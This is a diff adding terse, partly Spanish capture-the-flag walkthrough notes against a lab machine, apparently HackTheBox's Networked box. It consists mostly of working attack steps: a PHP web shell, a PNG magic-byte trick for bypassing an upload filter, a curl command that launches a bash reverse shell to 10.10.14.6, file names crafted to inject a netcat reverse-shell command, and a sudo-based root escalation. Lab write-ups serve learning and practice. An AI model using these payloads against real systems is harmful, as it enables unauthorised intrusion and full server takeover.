@@ -1,0 +1,49 @@
+open ports
+22
+80
+
+Folders
+
+/backup
+/uploads
+/icons
+
+Directory 200
+http://10.10.10.146/upload.php
+http://10.10.10.146/photos.php
+http://10.10.10.146/backup/backup.tar
+
+create a php web shell command
+
+<?php
+    system($_REQUEST['cmd']);
+?>
+
+Según el código analizado, el mime type acepta solo archivos png, para ello se deben agregar los magic bytes, que en este caso para un png son los siguientes
+89 50 4E 47 0D 0A 1A 0A
+
+Para ello se creará un archivo llamado mime_shell.php.png
+
+echo '89 50 4E 47 0D 0A 1A 0A' | xxd -p -r > mime_shell.php.png  
+
+Posteriormente se agregar lo que hay dentro de cmd.php.png al nuevo archivo con los magic bytes.
+ cat cmd.php.png >> mime_shell.php.png
+ 
+ una vez subida la webshell con el comando curl se puede hacer un llamado de la webshell
+
+curl -G --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.14.6/1234 0>&1"' http://10.10.10.146/uploads/10_10_14_6.php.png
+
+una vez dento del servidor se puede ejecutar el sigueiente comando dentro de la ubicación uploads
+touch -- ';nc -c bash  10.10.14.6 9001;.php'
+
+se crea un archivo en la localización /var/www/html
+touch -- ';nc -c bash  10.10.14.6 9001;.php'
+
+Con el comando sudo -l muestra que la ubicación
+
+/usr/local/sbin/changename.sh tiene privilegios de root
+
+ejecutando el archivo y agregando en cualquier momento el /bin/bash.
+
+se logra la elevación de privilegios.
+
